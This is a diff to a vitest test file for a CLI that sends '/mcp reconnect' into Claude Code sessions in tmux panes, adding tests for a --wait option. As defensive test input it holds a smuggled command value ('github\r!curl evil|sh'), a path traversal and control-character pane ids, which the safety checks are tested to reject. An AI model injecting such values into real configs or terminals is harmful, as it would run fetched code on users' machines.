@@ -1,5 +1,5 @@
 import { describe, it, expect, vi } from "vitest";
-import { composerState, reconnect, safeKey, undimmed, RECONNECT_HELP } from "../src/cli/reconnect.ts";
+import { composerState, parseWait, reconnect, safeKey, undimmed, MAX_WAIT_MS, RECONNECT_HELP, WAIT_POLL_MS } from "../src/cli/reconnect.ts";
 import { brokerKeyOf, mcpEntry, SkippedFolder } from "../src/cli/mcp-config.ts";
 import { TmuxTimeout, type Pane, type TmuxServer } from "../src/cli/tmux.ts";
 import { makeDeps, config, GROUPS } from "./helpers/cli-deps.mjs";
@@ -167,7 +167,8 @@ describe("composerState (heuristic over Claude Code's screen)", () => {
 describe("safeKey", () => {
 	it("allows the names mcp-config writes, and nothing that could carry a newline or a command", () => {
 		for (const k of ["github", "gh-broker", "gh-broker-repo", "A.b_c-9"]) expect(safeKey(k)).toBe(true);
-		for (const k of ["github\r!curl evil|sh", "a\nb", "with space", "tab\there", "ünïcode", "", "x".repeat(65), "../etc"]) expect(safeKey(k)).toBe(false);
+		for (const k of ["github\r!curl evil|sh", "a\nb", "with space", "tab\there", "ünïcode", "", "x".repeat(65), "../etc"])
+			expect(safeKey(k)).toBe(false);
 	});
 });
 
@@ -185,13 +186,118 @@ describe("agent reconnect", () => {
 	const info = { uid: 1000, gid: 1000, home: "/home/repo" };
 	/** Deps whose tmux has `panes` on SOCK; tmuxPaneText re-captures `fresh` (an idle screen by default; `null` means the pane is gone). */
 	const SERVER: TmuxServer = { socket: SOCK, binary: "/usr/bin/tmux" };
-	function withPanes(panes: Pane[], over: Record<string, unknown> = {}, files: Record<string, string> = {}, fresh: string | null = "❯ \n", dead: { socket: string; why: string }[] = []) {
+	function withPanes(
+		panes: Pane[],
+		over: Record<string, unknown> = {},
+		files: Record<string, string> = {},
+		fresh: string | null = "❯ \n",
+		dead: { socket: string; why: string }[] = []
+	) {
 		return makeDeps(
-			{ tmuxSockets: vi.fn(() => ({ servers: [SERVER], skipped: dead })), tmuxPanes: vi.fn((_server: TmuxServer, _info: unknown) => panes), tmuxPaneText: vi.fn(() => (fresh === null ? undefined : fresh)), ...over },
+			{
+				tmuxSockets: vi.fn(() => ({ servers: [SERVER], skipped: dead })),
+				tmuxPanes: vi.fn(() => panes),
+				tmuxPaneText: vi.fn(() => (fresh === null ? undefined : fresh)),
+				...over
+			},
 			{ [claude("repo")]: entry, ...files }
 		);
 	}
-	const pane = (id: string, text: string, over: Partial<Pane> = {}): Pane => ({ id, pid: 200, text, foreground: true, inMode: false, synchronized: false, ...over });
+	const pane = (id: string, text: string, over: Partial<Pane> = {}): Pane => ({
+		id,
+		pid: 200,
+		text,
+		foreground: true,
+		inMode: false,
+		synchronized: false,
+		...over
+	});
+
+	describe("--wait", () => {
+		const TYPING = "❯ half a sentence";
+		it("parses seconds and minutes up to 30m", () => {
+			expect(parseWait("90")).toBe(90_000);
+			expect(parseWait("90s")).toBe(90_000);
+			expect(parseWait("5m")).toBe(300_000);
+			expect(parseWait("30m")).toBe(MAX_WAIT_MS);
+			for (const bad of ["31m", "0", "0s", "5h", "-5", "5 m", "", "1.5m", "99999"]) expect(parseWait(bad)).toBeUndefined();
+		});
+
+		it("refuses a missing or bad time", () => {
+			const { d } = withPanes([pane("%1", IDLE)]);
+			expect(() => reconnect(["--wait"], config, d)).toThrow("--wait takes a time up to 30m");
+			expect(() => reconnect(["--wait", "forever"], config, d)).toThrow("--wait takes a time up to 30m");
+			expect(() => reconnect(["--wait=45m"], config, d)).toThrow("--wait takes a time up to 30m");
+		});
+
+		it("waits for a pane with text in its input box and sends once it clears", () => {
+			const { d, out } = withPanes([pane("%1", TYPING), pane("%2", IDLE)]);
+			// first re-capture is for %2's pre-send check; then %1 is polled: still typing, then clear
+			d.tmuxPaneText.mockReturnValueOnce(IDLE).mockReturnValueOnce(TYPING).mockReturnValueOnce(IDLE);
+			expect(reconnect(["repo", "--wait", "1m"], config, d)).toBe(0);
+			expect(out).toContain(`repo ${SOCK} %1 github waiting (composer not empty, or a dialog is showing)`);
+			expect(out).toContain("waiting up to 1m for 1 pane to clear");
+			expect(out).toContain(`repo ${SOCK} %1 github sent`);
+			expect(out).toContain(`repo ${SOCK} %2 github sent`);
+			expect(d.tmuxSend).toHaveBeenCalledTimes(2);
+			expect(d.sleep).toHaveBeenCalledTimes(2);
+			expect(d.sleep).toHaveBeenCalledWith(WAIT_POLL_MS);
+			expect(out[out.length - 1]).toBe("sent 2, skipped 0");
+		});
+
+		it("skips a pane still blocked at the deadline, with the reason and how long it waited", () => {
+			const { d, out } = withPanes([pane("%1", "Do you want to proceed?\n1. Yes")], {}, {}, "Do you want to proceed?\n1. Yes");
+			expect(reconnect(["repo", "--wait=12s"], config, d)).toBe(3);
+			expect(d.tmuxSend).not.toHaveBeenCalled();
+			// 5s, 5s, then the 2s left: never past the deadline
+			expect(d.sleep.mock.calls.map((c: number[]) => c[0])).toEqual([5000, 5000, 2000]);
+			expect(out).toContain(`repo ${SOCK} %1 github skipped (no Claude Code prompt on screen; still after waiting 12s)`);
+			expect(out).toContain("waiting up to 12s for 1 pane to clear");
+		});
+
+		it("waits on a pane that changed between the check and the send", () => {
+			const { d, out } = withPanes([pane("%1", IDLE)]);
+			d.tmuxPaneText.mockReturnValueOnce(TYPING).mockReturnValueOnce(IDLE);
+			expect(reconnect(["repo", "--wait", "30s"], config, d)).toBe(0);
+			expect(out).toContain(`repo ${SOCK} %1 github waiting (changed since capture)`);
+			expect(out).toContain(`repo ${SOCK} %1 github sent`);
+		});
+
+		it("drops a pane that disappears while waiting, retries one whose capture times out, and counts a failed send as skipped", () => {
+			const { d, out } = withPanes([pane("%1", TYPING), pane("%2", TYPING), pane("%3", TYPING)]);
+			// rounds poll the list back to front: %3, %2, %1
+			d.tmuxPaneText
+				.mockReturnValueOnce(IDLE) // %3 clears; its send fails
+				.mockImplementationOnce(() => {
+					throw new TmuxTimeout("tmux timed out");
+				}) // %2: tmux timed out this round
+				.mockReturnValueOnce(undefined) // %1 gone
+				.mockReturnValueOnce(IDLE); // %2 next round: clear
+			d.tmuxSend.mockImplementationOnce(() => {
+				throw new Error("pane is dead");
+			});
+			expect(reconnect(["repo", "--wait", "1m"], config, d)).toBe(3);
+			expect(out).toContain(`repo ${SOCK} %3 github skipped (send failed: pane is dead)`);
+			expect(out).toContain(`repo ${SOCK} %1 github skipped (gone while waiting)`);
+			expect(out).toContain(`repo ${SOCK} %2 github sent`);
+			expect(out[out.length - 1]).toBe("sent 1, skipped 2");
+		});
+
+		it("lets an unexpected tmux error through", () => {
+			const { d } = withPanes([pane("%1", TYPING)]);
+			d.tmuxPaneText.mockImplementationOnce(() => {
+				throw new Error("boom");
+			});
+			expect(() => reconnect(["repo", "--wait", "1m"], config, d)).toThrow("boom");
+		});
+
+		it("doesn't wait on a dry run", () => {
+			const { d, out } = withPanes([pane("%1", TYPING)]);
+			expect(reconnect(["repo", "--dry-run", "--wait", "1m"], config, d)).toBe(3);
+			expect(d.sleep).not.toHaveBeenCalled();
+			expect(out).toContain(`repo ${SOCK} %1 github skipped (composer not empty, or a dialog is showing)`);
+		});
+	});
 
 	it("sends /mcp reconnect with the agent's own key, as the agent, and lists it as sent", () => {
 		const { d, out } = withPanes([pane("%3", IDLE), pane("%4", IDLE, { foreground: false })]);
@@ -260,7 +366,11 @@ describe("agent reconnect", () => {
 			{
 				tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })),
 				tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: "/home/repo/.claude-alt" })]),
-				mcpIO: { read: (p: string) => (p === `${SAVED}/.claude.json` ? { text: saved, stat: { uid: 1000, gid: 1000, mode: 0o100600 } } : undefined), write: () => {} }
+				mcpIO: {
+					read: (p: string) =>
+						p === `${SAVED}/.claude.json` ? { text: saved, stat: { uid: 1000, gid: 1000, mode: 0o100600 } } : undefined,
+					write: () => {}
+				}
 			},
 			{ [claude("repo")]: JSON.stringify({ mcpServers: { x: { command: "npx" } } }), [`${SAVED}/.claude.json`]: saved }
 		);
@@ -272,9 +382,20 @@ describe("agent reconnect", () => {
 
 	it("sends the key from the session's own config folder, else the home file's", () => {
 		const ALT = "/home/repo/.claude-alt";
-		const files = { [claude("repo")]: entry, [`${ALT}/.claude.json`]: JSON.stringify({ mcpServers: { "gh-broker-repo": mcpEntry("repo", DIR) } }) };
+		const files = {
+			[claude("repo")]: entry,
+			[`${ALT}/.claude.json`]: JSON.stringify({ mcpServers: { "gh-broker-repo": mcpEntry("repo", DIR) } })
+		};
 		const { d, out } = makeDeps(
-			{ tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })), tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: ALT }), pane("%2", IDLE)]), mcpIO: { read: (p: string) => (files[p] === undefined ? undefined : { text: files[p], stat: { uid: 1000, gid: 1000, mode: 0o100600 } }), write: () => {}, scan: (home: string) => (home === "/home/repo" ? [ALT] : []) } },
+			{
+				tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })),
+				tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: ALT }), pane("%2", IDLE)]),
+				mcpIO: {
+					read: (p: string) => (files[p] === undefined ? undefined : { text: files[p], stat: { uid: 1000, gid: 1000, mode: 0o100600 } }),
+					write: () => {},
+					scan: (home: string) => (home === "/home/repo" ? [ALT] : [])
+				}
+			},
 			files
 		);
 		expect(reconnect(["repo"], config, d)).toBe(0);
@@ -292,7 +413,9 @@ describe("agent reconnect", () => {
 	});
 
 	it("blank control characters out of a socket path in the log line, and refuse an unsafe pane id", () => {
-		const { d, out } = withPanes([pane("%1", IDLE)], { tmuxSockets: vi.fn(() => ({ servers: [{ socket: "/tmp/tmux-1000/evil\rsock", binary: "tmux" }], skipped: [] })) });
+		const { d, out } = withPanes([pane("%1", IDLE)], {
+			tmuxSockets: vi.fn(() => ({ servers: [{ socket: "/tmp/tmux-1000/evil\rsock", binary: "tmux" }], skipped: [] }))
+		});
 		expect(reconnect(["repo"], config, d)).toBe(0);
 		expect(out).toContain("repo /tmp/tmux-1000/evil?sock %1 github sent");
 		const badId = withPanes([pane("%1\r!x", IDLE)]);
@@ -324,7 +447,12 @@ describe("agent reconnect", () => {
 	it("lists panes from every tmux server the agent runs, with the socket in the line", () => {
 		const OTHER: TmuxServer = { socket: "/home/repo/.tmux/claude", binary: "tmux" };
 		const { d, out } = makeDeps(
-			{ tmuxSockets: vi.fn(() => ({ servers: [SERVER, OTHER], skipped: [] })), tmuxPanes: vi.fn((server: TmuxServer) => (server.socket === SOCK ? [pane("%1", IDLE)] : server.socket === OTHER.socket ? [pane("%7", IDLE)] : [])) },
+			{
+				tmuxSockets: vi.fn(() => ({ servers: [SERVER, OTHER], skipped: [] })),
+				tmuxPanes: vi.fn((server: TmuxServer) =>
+					server.socket === SOCK ? [pane("%1", IDLE)] : server.socket === OTHER.socket ? [pane("%7", IDLE)] : []
+				)
+			},
 			{ [claude("repo")]: entry }
 		);
 		expect(reconnect(["repo"], config, d)).toBe(0);
@@ -348,7 +476,7 @@ describe("agent reconnect", () => {
 
 	it("keeps going when a send fails, counts it as skipped, and sanitises the tmux error", () => {
 		const { d, out } = withPanes([pane("%1", IDLE), pane("%2", IDLE)], {
-			tmuxSend: vi.fn((_s: unknown, p: string, _t: string, _i: unknown) => {
+			tmuxSend: vi.fn((_s: unknown, p: string) => {
 				if (p === "%1") throw new Error("server exited unexpectedly\x1b[31m\x9b and a C1 CSI");
 			})
 		});
@@ -399,7 +527,11 @@ describe("agent reconnect", () => {
 	});
 
 	it("a re-capture that times out skips the pane instead of judging a stale screen", () => {
-		const { d, out } = withPanes([pane("%1", IDLE)], { tmuxPaneText: vi.fn(() => { throw new TmuxTimeout("tmux did not answer within 5000 ms: tmux"); }) });
+		const { d, out } = withPanes([pane("%1", IDLE)], {
+			tmuxPaneText: vi.fn(() => {
+				throw new TmuxTimeout("tmux did not answer within 5000 ms: tmux");
+			})
+		});
 		expect(reconnect(["repo"], config, d)).toBe(3);
 		expect(out).toContain(`repo ${SOCK} %1 github skipped (tmux timed out)`);
 		expect(d.tmuxSend).not.toHaveBeenCalled();
